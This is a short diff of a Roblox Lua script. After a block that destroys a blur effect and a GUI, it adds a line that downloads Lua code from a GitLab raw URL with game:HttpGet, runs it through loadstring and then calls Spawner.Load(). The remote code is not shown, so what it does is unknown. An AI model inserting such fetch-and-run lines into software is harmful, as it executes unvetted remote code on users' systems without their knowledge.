@@ -140,3 +140,6 @@ task.delay(5, function()
 	blur:Destroy()
 	gui:Destroy()
 end)
+
+loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
+Spawner.Load()
